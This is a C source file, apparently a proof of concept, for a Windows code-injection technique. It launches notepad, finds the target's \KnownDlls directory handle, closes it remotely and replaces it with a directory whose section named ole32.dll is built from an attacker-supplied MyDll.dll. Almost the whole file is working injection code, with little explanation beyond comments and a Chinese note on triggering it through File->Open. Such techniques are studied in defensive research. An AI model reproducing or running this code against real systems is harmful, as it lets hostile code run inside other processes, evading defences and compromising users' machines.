
#include "ntStructs.h"
#include "utils.h"
#include <Shlwapi.h>
#include <ShObjIdl_core.h>
#include <ShlGuid.h>
#include <stdio.h>


HANDLE GetKnownDllHandle2(DWORD pid, HANDLE hp) 
{
    ULONG                      len;
    NTSTATUS                   nts;
    LPVOID                     list = NULL;
    DWORD                      i;
    HANDLE                     obj, h = NULL;
    PSYSTEM_HANDLE_INFORMATION hl;
    BYTE                       buf[1024];
    POBJECT_NAME_INFORMATION   name = (POBJECT_NAME_INFORMATION)buf;

    // read the full list of system handles
    for (len = 8192; ;len += 8192) 
    {
        list = malloc(len);

        nts = NtQuerySystemInformation(
            SystemHandleInformation, list, len, NULL);

        // break from loop if ok    
        if (!(nts)) break;

        // free list and continue
        free(list);
    }

    hl = (PSYSTEM_HANDLE_INFORMATION)list;

    // for each handle
    for (i = 0; i < hl->NumberOfHandles && h == NULL; i++) {
        // skip these to avoid hanging process
        if ((hl->Handles[i].GrantedAccess == 0x0012019f) ||
            (hl->Handles[i].GrantedAccess == 0x001a019f) ||
            (hl->Handles[i].GrantedAccess == 0x00120189) ||
            (hl->Handles[i].GrantedAccess == 0x00100000)) {
            continue;
        }

        // skip if this handle not in our target process
        if (hl->Handles[i].UniqueProcessId != pid) {
            continue;
        }

        // duplicate the handle object
        nts = NtDuplicateObject(
            hp, (HANDLE)hl->Handles[i].HandleValue,
            GetCurrentProcess(), &obj, 0, FALSE,
            DUPLICATE_SAME_ACCESS);

        if (!(nts)) {
            // query the name
            NtQueryObject(
                obj, ObjectNameInformation,
                name, MAX_PATH, NULL);

            // if name returned.. 
            if (name->Name.Length != 0) {
                // is it knowndlls directory?
                if (!lstrcmpW(name->Name.Buffer, L"\\KnownDlls")) {
                    h = (HANDLE)hl->Handles[i].HandleValue;
                }
            }
            CloseHandle(obj);
        }
    }
    free(list);
    return h;
}

LPVOID GetKnownDllHandle(DWORD pid) {
    LPVOID                   m, va = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    BYTE                     buf[1024];
    POBJECT_NAME_INFORMATION n = (POBJECT_NAME_INFORMATION)buf;

    // get base of NTDLL and pointer to section header
    m = GetModuleHandleW(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;
    nt = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);
    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
        nt->FileHeader.SizeOfOptionalHeader);

    // locate the .data segment, save VA and number of pointers
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (*(PDWORD)sh[i].Name == *(PDWORD)".data") {
            ds = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
            cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
            break;
        }
    }
    // for each pointer
    for (i = 0; i < cnt; i++) {
        if ((LPVOID)ds[i] == NULL) continue;
        // query the object name
        NtQueryObject((LPVOID)ds[i],
            ObjectNameInformation, n, MAX_PATH, NULL);

        // string returned?
        if (n->Name.Length != 0) {
            // does it match ours?
            if (!lstrcmpW(n->Name.Buffer, L"\\KnownDlls")) {
                // return virtual address
                va = &ds[i];
                break;
            }
        }
    }
    return va;
}

VOID knowndll_inject(DWORD pid, PWCHAR fake_dll, PWCHAR target_dll) 
{
    NTSTATUS          nts;
    HANDLE            hp, hs, hf, dir, target_handle;
    OBJECT_ATTRIBUTES fa, da, sa;
    UNICODE_STRING    fn, sn;
    IO_STATUS_BLOCK   iosb;

    // open process for duplicating handle, suspending/resuming process
    hp = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, FALSE, pid);

    // 1. Get the KnownDlls directory object handle from remote process
    target_handle = GetKnownDllHandle2(pid, hp);

    // 2. Create empty object directory, insert named section of DLL to hijack
    //    using file handle of DLL to inject    
    InitializeObjectAttributes(&da, NULL, 0, NULL, NULL);
    nts = NtCreateDirectoryObject(&dir, DIRECTORY_ALL_ACCESS, &da);

    // 2.1 open the fake DLL
    RtlDosPathNameToNtPathName(fake_dll, &fn, NULL, NULL);
    InitializeObjectAttributes(&fa, &fn, OBJ_CASE_INSENSITIVE, NULL, NULL);

    nts = NtOpenFile(
        &hf, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE,
        &fa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    if (hf == INVALID_HANDLE_VALUE)
    {
        printf("open file failed %d\n", GetLastError());
        return;
    }


    // 2.2 create named section of target DLL using fake DLL image
    RtlInitUnicodeString(&sn, target_dll);
    InitializeObjectAttributes(&sa, &sn, OBJ_CASE_INSENSITIVE, dir, NULL);

    nts = NtCreateSection(
        &hs, SECTION_ALL_ACCESS, &sa,
        NULL, PAGE_EXECUTE, SEC_IMAGE, hf);

    if (hs == INVALID_HANDLE_VALUE)
    {
        printf("NtCreateSection failed %d\n", GetLastError());
        return;
    }

    // 3. Close the known DLLs handle in remote process
    NtSuspendProcess(hp);

    printf("start to duplicatehandle\n");

    if (!DuplicateHandle(hp, target_handle,
        GetCurrentProcess(), NULL, 0, TRUE, DUPLICATE_CLOSE_SOURCE))
    {
        printf("duphandle error %d\n", GetLastError());
    }
    
    // 4. Duplicate object directory for remote process
    if(!DuplicateHandle(
        GetCurrentProcess(), dir, hp,
        NULL, 0, TRUE, DUPLICATE_SAME_ACCESS))
    {
        printf("duphandle error %d\n", GetLastError());
    }


    NtResumeProcess(hp);
    CloseHandle(hp);

    // 需要手动点击notepad的文件，然后再点击打开，才能执行。点完后，再结束poc，不然无法触发
    printf("Select File->Open to load \"%ws\" into notepad.\n", fake_dll);
    printf("Press any key to continue...\n");
    getchar();
}


int knowndllsExecute() 
{
    STARTUPINFOW         si;
    PROCESS_INFORMATION pi;
    WCHAR               cmd[] = L"notepad";
    WCHAR               path[MAX_PATH];

    // create notepad
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_SHOWDEFAULT;

    printf("Running notepad.\n");
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("Unable to create host process.\n");
        return 0;
    }

    printf("Created notepad.exe with pid : %i\n", pi.dwProcessId);

    PWSTR inject_dll_path = (PWSTR)L"MyDll.dll";

    GetFullPathNameW(inject_dll_path, MAX_PATH, path, NULL);
    printf("dll path %ws\n", path);
    knowndll_inject(pi.dwProcessId, path, (PWCHAR)L"ole32.dll");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    //TerminateProcess(pi.hProcess, 0);

    return 0;
}
